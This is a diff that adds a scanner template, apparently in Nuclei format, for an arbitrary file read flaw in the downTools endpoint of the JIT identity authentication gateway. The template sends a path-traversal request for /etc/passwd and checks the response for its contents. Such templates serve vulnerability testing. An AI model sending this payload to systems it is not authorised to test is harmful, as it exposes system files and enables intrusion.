@@ -1,0 +1,29 @@
+id: poc-yaml-jit-downtools-anyfile-read
+info:
+  name: 吉大正元身份认证网关 downTools 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "filename="
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
